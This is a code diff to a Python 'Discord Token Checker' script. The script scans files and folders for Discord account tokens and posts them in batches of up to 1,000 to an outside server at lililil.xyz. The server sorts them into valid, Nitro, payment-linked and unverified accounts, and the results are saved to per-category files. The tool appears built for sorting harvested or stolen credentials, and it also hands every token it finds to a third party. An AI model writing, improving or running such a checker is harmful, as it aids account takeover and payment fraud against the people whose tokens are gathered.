@@ -2,8 +2,7 @@ import json
 import math
 import os
 import re
-from pathlib import Path
-from sys import exit
+import pathlib
 
 import jwt
 import requests
@@ -14,11 +13,11 @@ def cls():
     os.system("cls" if os.name == "nt" else "clear")
 
 
-def fast_exit(error):
+def fast_exit(message):
     print()
-    print(error)
+    print(message)
     print()
-    input(f"{Fore.RESET}Press Enter button for exit.")
+    input(f"Press Enter button for exit.")
     cls()
     exit()
 
@@ -26,6 +25,8 @@ def fast_exit(error):
 class Checker:
     def __init__(self):
         self.url = "https://lililil.xyz/checker"
+        self.max_tokens = 10000
+        self.tokens_part = 1000
         self.tokens_not_parsed = ""
         self.tokens_parsed = []
         self.res = {}
@@ -39,6 +40,8 @@ class Checker:
 /____/_/___/\__/\___/_/  \_,_/   /_/  \___/_/\_\\__/_//_/  \___/_//_/\__/\__/_/\_\\__/_/    |___/____/ 
                                                                                            {Fore.CYAN}by GuFFy_OwO
 {Fore.RESET} 
+
+Telegram Bot with same functionality: {Fore.CYAN}https://t.me/Discord_Token_Checker_bot{Fore.RESET}
 """)
 
         print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
@@ -59,13 +62,13 @@ class Checker:
                 fast_exit(f"{token_file_name} directory not exist.")
 
             if os.path.isfile(token_file_name):
-                with open(token_file_name, "r", errors='ignore') as f:
+                with open(token_file_name, "r", errors="ignore") as f:
                     self.tokens_not_parsed = f.read()
             else:
                 types = ["*.txt", "*.html", "*.json"]
                 for search_type in types:
-                    for path in Path(token_file_name).rglob(search_type):
-                        with open(path, "r", errors='ignore') as f:
+                    for path in pathlib.Path(token_file_name).rglob(search_type):
+                        with open(path, "r", errors="ignore") as f:
                             self.tokens_not_parsed += f.read()
         else:
             fast_exit("Invalid Option.")
@@ -84,53 +87,74 @@ class Checker:
                 if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
                     self.tokens_parsed.append(token)
 
-        if len(self.tokens_parsed) > 10000:
+        if len(self.tokens_parsed) > self.max_tokens:
             fast_exit(
-                f"The current API limit is {Fore.CYAN}10000{Fore.RESET} tokens. Please sort the tokens by removing the "
-                f"cherished invalid tokens. Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
+                f"The current API limit is {Fore.CYAN}{self.max_tokens}{Fore.RESET} tokens. "
+                f"Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
             )
         elif len(self.tokens_parsed) == 0:
             fast_exit("Parser did not found tokens.")
 
-    def send_tokens(self):
         print()
+        print(f"Found {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens!")
 
-        tokens_length = 2500 if len(self.tokens_parsed) > 2500 else len(self.tokens_parsed)
-        time = int(round(10 * math.sqrt(tokens_length) * len(self.tokens_parsed) * 1.5 / 1000 / 60))
+    def send_tokens(self):
+        res = {"tokensInfo": {"valid": [], "nitro": [], "payment": [], "unverified": [], "invalid": [],
+                              "parsedTokens": []}, "tokensData": {}}
+        parts = [self.tokens_parsed[d:d + self.tokens_part] for d in range(0, len(self.tokens_parsed), self.tokens_part)]
 
-        print(
-            f"Send tokens... Verification of tokens can take some time. "
-            f"{Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens - {Fore.CYAN}{time}{Fore.RESET} min."
-        )
+        i = 1
+        for tokens in parts:
+            if len(tokens) < 100:
+                ms = len(tokens) * 50
+            else:
+                ms = (len(tokens) // self.tokens_part * self.tokens_part * 5 * math.sqrt(
+                    len(tokens) // self.tokens_part * self.tokens_part) +
+                      len(tokens) % self.tokens_part * 5 * math.sqrt(len(tokens) % self.tokens_part))
+            time = int(round(ms * 1.5 / 1000 / 60))
 
-        try:
-            res = requests.post(self.url, json={"action": "checker", "data": self.tokens_parsed})
+            print()
+            print(
+                f"Sending {Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{len(parts)}{Fore.RESET} part of tokens... "
+                f"{Fore.CYAN}{len(tokens)}{Fore.RESET} tokens - {Fore.CYAN}{time}{Fore.RESET} min."
+            )
 
-            if res.status_code == 429:
-                fast_exit(
-                    f"Too many tokens check, try after "
-                    f"{Fore.CYAN}{res.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
-                )
-            elif res.status_code != 200:
-                fast_exit(f"Status code is {Fore.CYAN}{res.status_code}{Fore.RESET}. {res.json()}")
+            try:
+                req = requests.post(self.url, json=tokens)
 
-            self.res = res.json()
-        except Exception as e:
-            fast_exit(f"An error occurred while trying to send the file to the server. {str(e)}")
+                if req.status_code == 429:
+                    fast_exit(
+                        f"Too many tokens check, try after "
+                        f"{Fore.CYAN}{req.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
+                    )
+                elif req.status_code != 200:
+                    fast_exit(f"Status code is {Fore.CYAN}{req.status_code}{Fore.RESET}. {req.json()}")
 
-    def save_res(self):
-        result = ""
+                for tokens_type in res["tokensInfo"]:
+                    res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
+                res["tokensData"].update(req.json()["tokensData"])
+            except Exception as e:
+                fast_exit(f"An error occurred while trying to send the file to the server. {str(e)}")
+
+            self.res = res
+            checker.save_res(i, len(parts))
+            i += 1
+
+        fast_exit("All tokens saved!")
+
+    def save_res(self, i, parts):
+        stats = ""
         for token_type in self.res["tokensInfo"].keys():
             if self.res["tokensInfo"][token_type]:
-                result += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
+                stats += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
                 with open(token_type + ".txt", "w") as f:
                     for item in self.res["tokensInfo"][token_type]:
                         f.write("%s\n" % item)
 
-        with open("json_data.json", "w") as f:
+        with open("tokens_data.json", "w") as f:
             json.dump(self.res, f, indent=4)
 
-        fast_exit(f"Tokens saved!\n\nStats: {result[:-3]}")
+        print(f"{Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{parts}{Fore.RESET} part of tokens saved!\nStats: {stats[:-2]}")
 
 
 if __name__ == "__main__":
@@ -138,4 +162,3 @@ if __name__ == "__main__":
     checker.main()
     checker.parse_tokens()
     checker.send_tokens()
-    checker.save_res()
